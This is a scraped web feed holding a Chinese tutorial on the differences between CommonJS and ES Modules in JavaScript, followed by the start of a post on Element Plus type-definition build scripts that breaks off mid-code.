            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2208293602984286/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Dr_哈哈
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T07:32:45.000Z" title="Tue Jan 06 2026 07:32:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 JavaScript 的发展历程中，模块化一直是一个核心话题。目前主流的两种规范——<strong>CommonJS (CJS)</strong> 和 <strong>ES Modules (ESM)</strong>——在语法、机制和设计理念上有着本质的区别。</p>
<p>本文将跳出单纯的代码堆砌，从设计理念、运行机制和实际应用角度，带你深入理解这两者的差异。</p>
<h2 data-id="heading-0">核心差异速览</h2>
<p>如果不想看长篇大论，这张表总结了最核心的区别：</p>








































<table><thead><tr><th align="left">特性</th><th align="left">CommonJS (CJS)</th><th align="left">ES Modules (ESM)</th></tr></thead><tbody><tr><td align="left"><strong>主要环境</strong></td><td align="left">Node.js (服务端)</td><td align="left">浏览器 &amp; Node.js (通用)</td></tr><tr><td align="left"><strong>设计理念</strong></td><td align="left">动态运行时对象</td><td align="left">静态声明构建</td></tr><tr><td align="left"><strong>加载方式</strong></td><td align="left"><strong>同步</strong> (阻塞执行)</td><td align="left"><strong>异步</strong> (非阻塞)</td></tr><tr><td align="left"><strong>依赖解析</strong></td><td align="left">运行时 (Runtime)</td><td align="left">编译时 (Compile-time)</td></tr><tr><td align="left"><strong>导出值</strong></td><td align="left"><strong>值拷贝</strong> (导出后不再变化)</td><td align="left"><strong>实时绑定</strong> (引用值随内部变化)</td></tr><tr><td align="left"><strong>Tree Shaking</strong></td><td align="left">❌ 不支持</td><td align="left">✅ 支持 (减少代码体积)</td></tr></tbody></table>
<h2 data-id="heading-1">1. 语法与设计理念</h2>
<h3 data-id="heading-2">CommonJS: "对象"的传递</h3>
<p>CommonJS 诞生于 Node.js 早期，它的核心思想非常简单：<strong>模块就是一个对象</strong>。
当你使用 <code>require</code> 时，你实际上是在获取这个对象；当你使用 <code>module.exports</code> 时，你是在给这个对象添加属性。</p>
<ul>
<li><strong>直观感受</strong>：像是在操作一个普通的 JavaScript 对象。</li>
<li><strong>灵活性</strong>：因为是对象，你可以动态地修改它，甚至根据条件导出不同的内容。</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// CommonJS 就像在拼装一个对象</span>
<span class="hljs-keyword">const</span> lib = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./lib'</span>); <span class="hljs-comment">// 同步读取文件并执行</span>
<span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">'development'</span>) {
  <span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = { ...lib, <span class="hljs-attr">debug</span>: <span class="hljs-literal">true</span> }; <span class="hljs-comment">// 动态修改导出</span>
}
</code></pre>
<h4 data-id="heading-3">🔍 深入：CommonJS 导出的“潜规则” (exports vs module.exports)</h4>
<p>很多开发者容易混淆 <code>exports</code> 和 <code>module.exports</code>。记住一句话：<strong><code>exports</code> 只是 <code>module.exports</code> 的引用（快捷方式），Node.js 最终认的只有 <code>module.exports</code>。</strong></p>
<ol>
<li><strong>默认情况</strong>：两者指向同一个空对象 <code>{}</code>。</li>
<li><strong>断开引用</strong>：如果你直接给 <code>exports</code> 赋值，它就断开了与 <code>module.exports</code> 的联系，导致导出无效。</li>
<li><strong>优先级</strong>：如果两者发生冲突，<code>module.exports</code> 拥有最高优先级。</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ✅ 正确：给引用对象添加属性</span>
<span class="hljs-built_in">exports</span>.<span class="hljs-property">a</span> = <span class="hljs-number">1</span>; 
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>.<span class="hljs-property">b</span> = <span class="hljs-number">2</span>;
<span class="hljs-comment">// 最终导出：{ a: 1, b: 2 }</span>

<span class="hljs-comment">// ❌ 错误：直接赋值 exports (断开引用)</span>
<span class="hljs-built_in">exports</span> = { <span class="hljs-attr">a</span>: <span class="hljs-number">1</span> }; 
<span class="hljs-comment">// 最终导出：{} (默认值)，因为 module.exports 还是空的</span>

<span class="hljs-comment">// ⚠️ 覆盖：module.exports 优先级最高</span>
<span class="hljs-built_in">exports</span>.<span class="hljs-property">a</span> = <span class="hljs-number">1</span>;
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = { <span class="hljs-attr">b</span>: <span class="hljs-number">2</span> };
<span class="hljs-comment">// 最终导出：{ b: 2 } (exports.a 的修改被丢弃了)</span>
</code></pre>
<h3 data-id="heading-4">ES Modules: "静态"的契约</h3>
<p>ES Modules 是 JavaScript 官方标准，它的设计目标是<strong>静态分析</strong>。
这意味着在代码运行之前，编译器就能知道模块之间的依赖关系。</p>
<ul>
<li><strong>直观感受</strong>：更像是一种声明式语法 (<code>import</code>/<code>export</code>)，而不是执行语句。</li>
<li><strong>优势</strong>：正因为这种静态特性，工具链（如 Webpack, Vite）才能进行 Tree Shaking（摇树优化），移除未使用的代码。</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ESM 是静态的声明</span>
<span class="hljs-keyword">import</span> { func } <span class="hljs-keyword">from</span> <span class="hljs-string">'./lib.js'</span>; <span class="hljs-comment">// 必须在顶层，不能在 if 语句中</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> value = <span class="hljs-number">123</span>;        <span class="hljs-comment">// 明确的导出接口</span>
</code></pre>
<hr/>
<h2 data-id="heading-5">2. 加载机制：同步 vs 异步</h2>
<p>这是两者在运行时行为上最大的区别。</p>
<pre><code class="hljs language-text" lang="text">┌──────────────────────┐          ┌──────────────────────┐
│  CommonJS (同步阻塞)  │          │   ES Modules (异步)   │
└──────────┬───────────┘          └──────────┬───────────┘
           │                                 │
           ▼                                 ▼
┌──────────────────────┐          ┌──────────────────────┐
│   开始执行 main.js     │          │     解析 main.js     │
└──────────┬───────────┘          └──────────┬───────────┘
           │                                 │
           ▼                                 ▼
┌──────────────────────┐          ┌──────────────────────┐
│     遇到 require      │          │     构建依赖图        │
└──────────┬───────────┘          └──────────┬───────────┘
           │                                 │
           ▼                                 ▼
╔══════════════════════╗          ╔══════════════════════╗
║ 🛑 暂停执行，加载文件    ║          ║ ⚡️ 并行下载/读取依赖     ║
║    (等待 I/O 完成)     ║          ║     (不阻塞主线程)      ║
╚══════════════════════╝          ╚══════════════════════╝
           │                                 │
           ▼                                 ▼
┌──────────────────────┐          ┌──────────────────────┐
│     获取导出对象       │          │   按序实例化与求值      │
└──────────┬───────────┘          └──────────┬───────────┘
           │                                 │
           ▼                                 ▼
┌──────────────────────┐          ┌──────────────────────┐
│   继续执行 main.js    │           │       执行代码       │
└──────────────────────┘          └──────────────────────┘
</code></pre>
<h3 data-id="heading-6">CommonJS 的同步阻塞</h3>
<p>CommonJS 专为服务端设计，文件都在本地磁盘，读取速度快。因此，<code>require()</code> 会<strong>暂停</strong>当前代码的执行，直到模块加载完成。</p>
<ul>
<li><strong>优点</strong>：逻辑简单，编写线性代码容易。</li>
<li><strong>缺点</strong>：不适合浏览器环境（网络请求慢，会造成页面卡顿）。</li>
</ul>
<h3 data-id="heading-7">ES Modules 的异步加载</h3>
<p>ESM 采用了两阶段过程：<strong>解析</strong>和<strong>执行</strong>。</p>
<ol>
<li><strong>解析阶段</strong>：浏览器或 Node.js 会先构建整个依赖图，并行下载所有模块。</li>
<li><strong>执行阶段</strong>：按照依赖顺序执行代码。</li>
</ol>
<ul>
<li><strong>优点</strong>：性能更好，支持复杂的依赖关系处理，支持浏览器环境。</li>
</ul>
<hr/>
<h2 data-id="heading-8">3. 深度解析：值拷贝 vs 实时绑定</h2>
<p>这是最容易被忽视，但导致 Bug 最多的差异。</p>
<h3 data-id="heading-9">CommonJS：按下快门的瞬间 (Value Copy)</h3>
<p>当 CommonJS 导出基础类型（数字、字符串）时，它导出的是<strong>那一瞬间的值的拷贝</strong>。
就像拍了一张照片，之后原模块里的值怎么变，照片里的样子都不会变。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// counter.js</span>
<span class="hljs-keyword">let</span> count = <span class="hljs-number">1</span>;
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  count,       <span class="hljs-comment">// 导出的是 1 这个数字</span>
  <span class="hljs-attr">inc</span>: <span class="hljs-function">() =&gt;</span> count++ 
};

<span class="hljs-comment">// main.js</span>
<span class="hljs-keyword">const</span> mod = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./counter'</span>);
mod.<span class="hljs-title function_">inc</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(mod.<span class="hljs-property">count</span>); <span class="hljs-comment">// 仍然是 1！因为导出的是拷贝</span>
</code></pre>
<h3 data-id="heading-10">ES Modules：连接的通道 (Live Binding)</h3>
<p>ESM 导出的是<strong>引用的绑定</strong>。
就像建立了一个连接通道，当你访问导出的变量时，你直接读取的是原模块内部的那个变量。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// counter.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">let</span> count = <span class="hljs-number">1</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">inc</span> = (<span class="hljs-params"/>) =&gt; count++;

<span class="hljs-comment">// main.js</span>
<span class="hljs-keyword">import</span> { count, inc } <span class="hljs-keyword">from</span> <span class="hljs-string">'./counter.js'</span>;
<span class="hljs-title function_">inc</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count); <span class="hljs-comment">// 变成了 2！这是实时更新的</span>
</code></pre>
<hr/>
<h2 data-id="heading-11">4. 实际使用场景指南</h2>
<p>与其列举代码，不如看看在什么情况下该用什么。</p>
<h3 data-id="heading-12">✅ 什么时候必须/应该用 ESM？</h3>
<ol>
<li><strong>浏览器端开发</strong>：所有现代前端框架（React, Vue, etc.）和构建工具（Vite, Webpack）默认都是 ESM。</li>
<li><strong>新开启的 Node.js 项目</strong>：Node.js 12+ 已完全支持 ESM，这是未来的标准。</li>
<li><strong>需要代码优化 (Tree Shaking)</strong>：如果你希望打包后的文件尽可能小，ESM 是必须的。</li>
<li><strong>跨平台库开发</strong>：如果你开发的库既要在 Node.js 跑，又要在浏览器跑。</li>
</ol>
<h3 data-id="heading-13">⚠️ 什么时候还得用 CommonJS？</h3>
<ol>
<li><strong>维护遗留的 Node.js 服务</strong>：很多老项目深耦合了 CommonJS 特性（如动态 require）。</li>
<li><strong>编写配置文件</strong>：某些老工具的配置文件（如旧版 <code>webpack.config.js</code>, <code>.eslintrc.js</code>）可能仍默认使用 CJS。</li>
<li><strong>非常特殊的动态加载需求</strong>：虽然 ESM 有 <code>import()</code> 动态导入，但在某些极端灵活的同步加载场景下，<code>require</code> 仍有优势。</li>
</ol>
<hr/>
<h3 data-id="heading-14">🌟 日常开发最佳实践</h3>
<p>在日常开发中，遵循这些原则可以避免大部分坑：</p>
<ul>
<li><strong>文件扩展名</strong>：
<ul>
<li>明确使用 <code>.mjs</code> (ESM) 或 <code>.cjs</code> (CJS) 可以避免歧义。</li>
<li>如果在 <code>package.json</code> 中设置了 <code>"type": "module"</code>，则 <code>.js</code> 默认为 ESM。</li>
</ul>
</li>
<li><strong>导入路径</strong>：
<ul>
<li>在 ESM 中，导入路径<strong>必须</strong>包含文件扩展名（如 <code>import x from './file.js'</code>），这与 CommonJS 不同。</li>
</ul>
</li>
<li><strong>混合使用</strong>：
<ul>
<li>尽量避免在同一个项目中混用。</li>
<li>如果必须混用，记住：<strong>ESM 可以导入 CJS (使用 <code>import</code>)，但 CJS 无法 <code>require</code> ESM</strong>（因为 ESM 是异步的，CJS 是同步的）。</li>
</ul>
</li>
<li><strong>默认导出 (Default Export)</strong>：
<ul>
<li>尽量使用<strong>命名导出 (Named Export)</strong>。它们对重构更友好，IDE 支持更好，且能更好地支持 Tree Shaking。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-15">🚀 从 CJS 迁移到 ESM 的注意事项</h3>
<p>如果你正在将老项目从 CJS 迁移到 ESM，注意这几个常见的“拦路虎”：</p>
<ol>
<li><strong><code>__dirname</code> 和 <code>__filename</code> 不见了</strong>：
<ul>
<li>ESM 中没有这两个全局变量。</li>
<li><strong>解决方案</strong>：使用 <code>import.meta.url</code> 结合 <code>path</code> 模块手动创建。</li>
</ul>
</li>
<li><strong>JSON 文件的导入</strong>：
<ul>
<li>CJS: <code>require('./data.json')</code> 直接用。</li>
<li>ESM: 需要使用断言语法 <code>import data from './data.json' assert { type: 'json' };</code> (Node.js 17.5+)。</li>
</ul>
</li>
<li><strong>严格模式</strong>：
<ul>
<li>ESM 默认开启严格模式 (<code>'use strict'</code>)，这可能会暴露老代码中未声明变量等问题。</li>
</ul>
</li>
</ol>
<hr/>
<p><strong>总结</strong>：ES Modules 是 JavaScript 的统一未来。虽然 CommonJS 在 Node.js 生态中仍将长期存在，但拥抱 ESM 意味着拥抱更好的性能、更标准的语法和更广阔的生态。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[解析ElementPlus打包源码（三、打包类型）]]></title>    <link>https://juejin.cn/post/7592058763985813550</link>    <guid>https://juejin.cn/post/7592058763985813550</guid>    <pubDate>2026-01-06T07:52:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592058763985813550" data-draft-id="7591948263859961894" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="解析ElementPlus打包源码（三、打包类型）"/> <meta itemprop="keywords" content="前端,JavaScript,Vue.js"/> <meta itemprop="datePublished" content="2026-01-06T07:52:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="jqq666"/> <meta itemprop="url" content="https://juejin.cn/user/2063132066587822"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            解析ElementPlus打包源码（三、打包类型）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2063132066587822/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    jqq666
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T07:52:46.000Z" title="Tue Jan 06 2026 07:52:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">runTask('generateTypesDefinitions')</h2>
<p>我们定位到相关的代码</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">'path'</span>
<span class="hljs-keyword">import</span> { readFile, writeFile } <span class="hljs-keyword">from</span> <span class="hljs-string">'fs/promises'</span>
<span class="hljs-keyword">import</span> glob <span class="hljs-keyword">from</span> <span class="hljs-string">'fast-glob'</span>
<span class="hljs-keyword">import</span> { copy, remove } <span class="hljs-keyword">from</span> <span class="hljs-string">'fs-extra'</span>
<span class="hljs-keyword">import</span> { buildOutput } <span class="hljs-keyword">from</span> <span class="hljs-string">'@element-plus/build-utils'</span>
<span class="hljs-keyword">import</span> { pathRewriter, run } <span class="hljs-keyword">from</span> <span class="hljs-string">'../utils'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">generateTypesDefinitions</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">run</span>(
    <span class="hljs-string">'npx vue-tsc -p tsconfig.web.json --declaration --emitDeclarationOnly --declarationDir dist/types'</span>
  )
  <span class="hljs-keyword">const</span> typesDir = path.<span class="hljs-title function_">join</span>(buildOutput, <span class="hljs-string">'types'</span>, <span class="hljs-string">'packages'</span>)
  <span class="hljs-keyword">const</span> filePaths = <span class="hljs-keyword">await</span> <span class="hljs-title function_">glob</span>(<span class="hljs-string">`**/*.d.ts`</span>, {
    <span class="hljs-attr">cwd</span>: typesDir,
    <span class="hljs-attr">absolute</span>: <span class="hljs-literal">true</span>,
  })
  <span class="hljs-keyword">const</span> rewriteTasks = filePaths.<span class="hljs-title function_">map</span>(<span class="hljs-keyword">async</span> (filePath) =&gt; {
    <span class="hljs-keyword">const</span> content = <span class="hljs-keyword">await</span> <span class="hljs-title function_">readFile</span>(filePath, <span class="hljs-string">'utf8'</span>)
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">writeFile</span>(filePath, <span class="hljs-title function_">pathRewriter</span>(<span class="hljs-string">'esm'</span>)(content), <span class="hljs-string">'utf8'</span>)
  })
  <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(rewriteTasks)
